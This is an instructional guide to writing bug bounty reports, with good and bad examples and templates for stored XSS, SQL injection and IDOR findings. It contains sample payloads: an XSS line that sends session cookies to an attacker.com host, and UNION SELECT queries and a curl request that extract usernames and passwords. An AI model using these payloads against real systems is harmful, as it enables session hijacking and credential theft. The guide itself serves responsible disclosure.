# Report Writing Guide for Bug Bounty

## Introduction

A bug bounty report is the deliverable that determines whether your finding gets accepted, rewarded, and resolved. Even a critical vulnerability can be rejected if the report is unclear, incomplete, or fails to demonstrate impact. This guide covers the structure of effective bug bounty reports, with before-and-after examples showing the difference between reports that get rewarded and reports that get closed.

The key principle is: write your report so that a triager can reproduce the bug in under five minutes and understand the business impact in one sentence. Every additional minute a triager spends understanding your report reduces your chance of a timely resolution.

## Practical Steps

### 1. Title Format

The title should summarize the vulnerability type, affected component, and impact in a single line.

**Bad title:**
```
XSS on your website
```

**Good title:**
```
Stored XSS in User Profile Bio allows session hijacking of any visitor (CRITICAL)
```

**Title formula:**

```
[Vulnerability Type] in [Affected Component] allows [Impact] ([Severity])
```

Examples:

```
SSRF via image URL parameter enables access to AWS metadata credentials (HIGH)
IDOR in /api/v2/orders/{id} exposes all customer PII (CRITICAL)
Reflected XSS in search parameter bypasses CSP via base tag injection (MEDIUM)
```

### 2. Severity Justification

Map the finding to a CVSS score or the platform severity criteria:

**Bad justification:**
```
This is critical because XSS is dangerous.
```

**Good justification:**
```
Severity: HIGH (CVSS 7.5)

Justification: This stored XSS executes in the context of the admin dashboard
(/admin/users). Any administrator viewing the compromised user profile will have
their session token exfiltrated. The admin dashboard has access to all customer
PII including SSNs and payment data. No user interaction is required beyond
viewing the user management page, which is part of the daily admin workflow.
```

### 3. Reproduction Steps

Write numbered, step-by-step instructions that anyone can follow:

**Bad reproduction:**
```
Just put a script tag in the comment field and it executes.
```

**Good reproduction:**
```
1. Log in as a standard user (test@demo.com / Password123!)
2. Navigate to https://target.com/profile/edit
3. In the "Bio" field, enter the following payload:
   <img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">
4. Click "Save Profile"
5. Log in as an administrator (admin@demo.com / AdminPass456!)
6. Navigate to https://target.com/admin/users
7. Observe the network request to attacker.com with the admin session cookie
8. The admin session is now compromised

Expected behavior: The bio content should be HTML-encoded before rendering.
Actual behavior: The bio content is rendered as raw HTML, executing JavaScript.
```

### 4. Impact Analysis

Clearly state what an attacker can achieve:

**Bad impact:**
```
An attacker can steal cookies.
```

**Good impact:**
```
Business Impact:

- Full account takeover of any administrator who views the compromised profile
- Access to the admin panel which contains PII for 50,000+ customers
- Ability to modify user roles, granting attacker persistent admin access
- Potential for lateral movement into internal systems via admin API endpoints
- Regulatory exposure under GDPR Article 32 (failure to protect personal data)
```

### 5. Remediation Suggestions

Provide actionable fix recommendations:

**Bad remediation:**
```
Fix the XSS.
```

**Good remediation:**
```
Remediation Recommendations:

1. Output Encoding: HTML-encode all user-generated content before rendering.
   Use a library like DOMPurify (frontend) or the server-side template
   engine's built-in escaping.

2. Content Security Policy: Implement a strict CSP header:
   Content-Security-Policy: default-src 'self'; script-src 'self'

3. Input Validation: Sanitize the bio field server-side to strip HTML tags:
   bio = bleach.clean(user_input, tags=[], strip=True)

4. HttpOnly Cookies: Mark session cookies as HttpOnly to prevent JavaScript
   access even if XSS occurs:
   Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### 6. Full Report Template

```
Title: [Vulnerability Type] in [Component] allows [Impact]

Severity: [CRITICAL/HIGH/MEDIUM/LOW]
CVSS Score: [X.X]

Description:
[A 2-3 sentence summary of what the vulnerability is and where it exists]

Steps to Reproduce:
1. [Step]
2. [Step]
...

Proof-of-Concept:
[Link to PoC or inline code]

Impact:
[What an attacker can achieve]

Remediation:
[How to fix it]

References:
[Links to OWASP, CVEs, or relevant documentation]
```

## References

- HackerOne Hacktivity (top reports): https://hackerone.com/hacktivity
- Bugcrowd Vulnerability Rating Taxonomy: https://bugcrowd.com/vulnerability-rating-taxonomy
- OWASP Bug Bounty Template: https://owasp.org/www-project-bug-bounty-template/
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
- PortSwigger Web Security Academy: https://portswigger.net/web-security

---

## Hands-on Exercises

1. **Exercise 1**: Select a vulnerability from HackerOne Hacktivity and rewrite the disclosure using the report template above, improving clarity and adding business impact analysis
2. **Exercise 2**: Write two reports for the same hypothetical XSS finding -- one "bad" report and one "excellent" report. Compare them side-by-side and identify specific improvements
3. **Exercise 3**: Create a report for a chained vulnerability (SSRF to internal service access) that includes a visual attack flow diagram and demonstrates why the combined severity is higher than individual findings

---

## Advanced Report Techniques

### Adding Video Evidence

Video recordings dramatically improve triage speed and reduce back-and-forth clarification:

```bash
# Record a PoC video on macOS
# Open QuickTime Player → File → New Screen Recording → record the PoC

# Record on Linux with recordmydesktop
recordmydesktop --output poc_sqli.ogv --windowid $(xdotool getactivewindow)

# Convert to a reasonable size
ffmpeg -i poc_sqli.ogv -c:v libx264 -crf 28 -preset fast poc_sqli.mp4

# Upload to a private YouTube video or include as attachment
```

**Video best practices:**
- Keep under 2 minutes; triagers will not watch 15-minute videos
- Start from a clean browser state (no cookies, no cached data)
- Show the login step if authentication is required
- Narrate or add text overlays explaining each step
- Display the URL bar prominently so the endpoint is visible

### Handling Triager Pushback

Sometimes triagers downgrade severity or mark reports as duplicates. Here is how to respond professionally:

```markdown
## Response to Duplicate Marking

Thank you for reviewing my report. I believe this finding differs from #12345
in the following ways:

1. **Different endpoint**: My finding affects /api/v2/users/{id}, while #12345
   reports on /api/v1/users/{id}
2. **Different exploit path**: The v2 API enforces role-based access control,
   but the bypass I found exploits a separate authorization middleware
3. **Different impact**: My finding exposes payment data (PCI scope) in addition
   to the PII covered by the original report

Would you like me to provide a side-by-side comparison with additional evidence?
```

**Escalation options:**
- Request re-triage through the platform's dispute process
- Provide additional evidence that differentiates your finding
- Demonstrate a higher impact than the original report showed
- Document the business impact that the duplicate report did not cover

### Report Templates by Vulnerability Class

Different vulnerability types require different report structures. Here are optimized templates for common bounty findings:

**SQL Injection Report Template:**

```markdown
Title: SQL Injection in [endpoint] allows [impact]

Severity: [CRITICAL/HIGH]
CVSS Score: [X.X]
CWE: CWE-89

Description:
The [parameter] parameter in [endpoint] is vulnerable to SQL injection.
The application concatenates user input directly into SQL queries
without parameterization, allowing an attacker to extract the full
database contents.

Steps to Reproduce:
1. Navigate to [endpoint]
2. Insert the following payload into [parameter]: ' UNION SELECT 1,2,3--
3. Observe the application returns 3 columns in the response
4. Extract database version: ' UNION SELECT @@version,2,3--
5. Extract table names: ' UNION SELECT table_name,2,3 FROM information_schema.tables--

Proof of Concept:
```bash
curl -s "https://target.com/api/search?q=' UNION SELECT username,password,3 FROM users--"
```

Impact:
- Full database read access confirmed
- Database contains [X] user records with PII
- Any authenticated user (or unauthenticated) can exploit

Remediation:
- Use parameterized queries / prepared statements
- Implement input validation with allowlists
- Apply least-privilege database permissions
```

**IDOR Report Template:**

```markdown
Title: IDOR in [endpoint] allows unauthorized access to [resource]

Severity: [HIGH/CRITICAL]
CWE: CWE-639

Description:
The [endpoint] endpoint does not verify that the requesting user
is authorized to access the requested resource. By changing the
[ID parameter] value, an attacker can access any user's [resource].

Steps to Reproduce:
1. Authenticate as User A (attacker@test.com)
2. Request: GET /api/v1/users/42/profile
3. Observe: Returns User B's profile data (name, email, phone, address)
4. Iterate IDs 1-100 to confirm mass data exposure

Impact:
- [X] user records accessible without authorization
- Data includes [list PII types]
- No rate limiting on API endpoint enables mass enumeration
```
